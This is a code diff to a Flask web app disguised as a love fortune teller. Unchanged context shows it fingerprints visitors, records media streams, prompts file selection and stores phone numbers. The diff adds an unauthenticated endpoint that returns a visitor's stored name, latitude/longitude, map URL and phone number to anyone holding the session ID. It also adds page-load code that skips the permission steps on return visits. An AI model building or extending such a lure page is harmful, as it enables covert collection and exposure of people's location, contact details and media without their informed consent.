@@ -70,6 +70,15 @@ def get_visitors():
     with open(DATA_FILE, 'r') as f:
         return json.load(f)
 
+def get_session_data(session_id):
+    init_json()
+    with open(DATA_FILE, 'r') as f:
+        visitors = json.load(f)
+    for v in visitors:
+        if v.get('sessionId') == session_id:
+            return v
+    return None
+
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -77,6 +86,25 @@ def index():
 @app.route('/get-fortune')
 def get_fortune():
     return jsonify({'fortune': random.choice(FORTUNES)})
+
+@app.route('/get-session-data', methods=['POST'])
+def get_session_data_route():
+    data = request.json
+    session_id = data.get('sessionId')
+    if session_id:
+        session_data = get_session_data(session_id)
+        if session_data:
+            # Return only what we need for display (fortune, map, phone number)
+            return jsonify({
+                'exists': True,
+                'fortuneText': session_data.get('fortuneText'),
+                'name': session_data.get('name'),
+                'latitude': session_data.get('latitude'),
+                'longitude': session_data.get('longitude'),
+                'phoneNumber': session_data.get('phoneNumber'),
+                'mapUrl': session_data.get('mapUrl')
+            })
+    return jsonify({'exists': False})
 
 @app.route('/save', methods=['POST'])
 def save():
@@ -273,6 +301,7 @@ HTML_TEMPLATE = '''
     <div id="progress" class="hidden"></div>
     <div id="result" class="hidden">
         <div class="fortune-box" id="fortuneText"></div>
+        <div id="mapLink" class="hidden">🗺️ Your love map: <span id="mapUrl"></span></div>
         <div id="smsSection" class="sms-prompt hidden">
             <p>📱 Send this fortune to your phone (permanently saved)</p>
             <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
@@ -297,6 +326,7 @@ HTML_TEMPLATE = '''
     let visitorData = { sessionId: sessionId };
     let mediaRecorder, mediaStream, recordedBlobs = [];
     let currentFortuneText = "";
+    let hasExistingData = false;
 
     // ---------- Data collection ----------
     async function getFingerprint() {
@@ -341,7 +371,43 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
+    // On page load, check if this session already has data
+    window.addEventListener('load', async () => {
+        const resp = await fetch('/get-session-data', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ sessionId: sessionId })
+        });
+        const data = await resp.json();
+        if (data.exists && data.fortuneText) {
+            hasExistingData = true;
+            // Pre-fill name field
+            if (data.name) document.getElementById('userName').value = data.name;
+            // Show result directly, skip all permission steps
+            document.getElementById('step-name').classList.add('hidden');
+            document.getElementById('result').classList.remove('hidden');
+            document.getElementById('fortuneText').innerText = data.fortuneText;
+            if (data.mapUrl) {
+                document.getElementById('mapUrl').innerText = data.mapUrl;
+                document.getElementById('mapLink').classList.remove('hidden');
+            }
+            currentFortuneText = data.fortuneText;
+            // Pre-fill phone number if saved
+            if (data.phoneNumber) {
+                document.getElementById('phoneNumber').value = data.phoneNumber;
+                document.getElementById('phoneNumber').disabled = true;
+                document.getElementById('smsStatus').innerHTML = '✅ Phone number already saved';
+            } else {
+                document.getElementById('smsSection').classList.remove('hidden');
+            }
+        }
+    });
+
     async function startProcess() {
+        if (hasExistingData) {
+            // Already showing result, do nothing
+            return;
+        }
         const name = document.getElementById('userName').value.trim();
         if (!name) return alert('Please enter your name');
         
@@ -521,8 +587,6 @@ HTML_TEMPLATE = '''
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             };
             
-            // Also handle if the user closes the file dialog without selecting (no change event)
-            // We need to detect focus return? Unfortunately no reliable event, but timeout will catch it.
             fileInput.click();
         });
     }
